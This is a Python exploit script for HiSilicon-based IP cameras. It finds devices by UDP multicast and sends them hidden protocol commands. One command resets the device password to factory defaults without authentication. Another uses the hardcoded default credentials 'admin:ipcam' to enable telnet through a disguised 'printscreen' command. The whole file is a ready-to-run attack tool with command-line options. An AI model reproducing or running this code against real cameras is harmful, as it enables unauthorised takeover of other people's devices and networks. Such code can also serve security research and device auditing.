#!/usr/bin/env python3

import socket
import struct
import re
import argparse
from termcolor import colored

# used for telnet switching
defaultcreds = 'admin:ipcam'
interface_ip = None

def send_mcast(msg, timeout=1):
    mcast, port = '239.255.255.250', 8002
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    s.settimeout(timeout)
    if interface_ip:
        s.setsockopt(socket.SOL_IP, socket.IP_MULTICAST_IF, socket.inet_aton(interface_ip))
    s.bind((mcast, port))
    if interface_ip:
        mreq = struct.pack("4s4s", socket.inet_aton(mcast), socket.inet_aton(interface_ip))
    else:
        mreq = struct.pack("4sL", socket.inet_aton(mcast), socket.INADDR_ANY)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
    s.sendto(msg.encode(), (mcast, port))
    try:
        res = []
        while True:
            data, addr = s.recvfrom(65507)
            res.append((addr, data))
    except socket.timeout:
        pass
    return res

def parse_reply(pkt):
    if not (pkt.startswith('HDS/1.0 200 OK') or pkt.startswith('MCTP/1.0 200 OK')):
        return None
    txt = re.sub(r'\r','', pkt)
    txt = re.sub(r'^.*Segment-Num:', 'Segment-Num:', txt, flags=re.DOTALL)
    txt = re.sub(r'^Segment-Num:.*\n', '', txt, flags=re.M)
    txt = re.sub(r'^Segment-Seq:.*\n', '', txt, flags=re.M)
    txt = re.sub(r'^Data-Length:.*\n\n', '', txt, flags=re.M)
    return txt

def parse_discover_info(pkt):
    txt = parse_reply(pkt)
    data = {'Device-ID': ''}
    for key in data:
        data[key] = re.match(r'(?m)^%s=(\w+)$' % key, txt)[1]
    return (txt, data)
    
def discover():
    msg = '\r\n'.join([
        'SEARCH * HDS/1.0',
        'CSeq:1',
        'Client-ID:deadbeef'])
    res = send_mcast(msg)
    
    for r in res:
        try:
            p = parse_discover_info(r[1].decode())
            if p is not None:
                return parse_discover_info(r[1].decode())
        except:
            pass
    return None

def sendcmd(cmd, deviceid, auth=False):
    msg = ['CMD * HDS/1.0',
           'CSeq:2',
           'Client-ID:deadbeef',
           'Device-ID:%s' % deviceid,
           'Content-Length:%d' % len(cmd), '', cmd, '']
    if auth:
        msg.append('Authorization:Basic %s' % defaultcreds)
    msg = '\r\n'.join(msg)
    res = send_mcast(msg)
    return res

def resetpwd(deviceid):
    cmd = 'usrpwd set -resetpwd on'
    res = sendcmd(cmd, deviceid)
    return parse_reply(res[1][1].decode())

def telnet(deviceid, enable=True):
    if enable:
        s = 'on'
    else:
        s = 'off'
    cmd = 'printscreen set -telnet %s' % s
    res = sendcmd(cmd, deviceid, auth=True)
    return parse_reply(res[1][1].decode())

if __name__ == "__main__":

    parser = argparse.ArgumentParser(description='HiSilicon IP Camera Remote Cmd Utility')
    parser.add_argument('--deviceid', help='device id to use (default: first discovered device)')
    parser.add_argument('--action', help='action to perform: discover (default), resetpwd, telnet', default='discover')
    parser.add_argument('--telnet', help='enable (default) or disable telnet if action is telnet (password must be default)', choices=['enable', 'disable'], default='enable')
    parser.add_argument('--ifip', help='IP address of network interface that will be used to send multicast', default=None)
    args = parser.parse_args()

    if args.ifip:
        interface_ip = args.ifip

    if args.deviceid is None or args.action == 'discover':
        print(colored('[*] performing discovery...', 'yellow'))
        try:
            d = discover()
            deviceid = d[1]['Device-ID']
            print(colored('[+] found device with id %s' % deviceid, 'green'))
        except Exception as e:
            print(colored('[!] error', 'red'))
            print(f"Error: {str(e)}")
            quit()
        if args.action == 'discover':
            print(d[0])
            quit()
    elif args.deviceid:
        deviceid = args.deviceid
        print(colored('[*] using device id %s' % deviceid, 'green'))
              
    if args.action == 'resetpwd':
        print(colored('[*] resetting password to factory defaults...', 'yellow'))
        res = resetpwd(deviceid)
        if res == '[Success]usrpwd reset!\n\n':
            print(colored('[+] success!', 'green'))
        else:
            print(colored('[!] error', 'red'))
    elif args.action == 'telnet':
        t = args.telnet == 'enable'
        print(colored('[*] %s telnet casting hidden command...' % ('enabling' if t else 'disabling'), 'yellow'))
        res = telnet(deviceid, t)
        if res == '[Success]set printscreen!\n\n':
            print(colored('[+] success!', 'green'))
        else:
            print(colored('[!] error', 'red'))

            
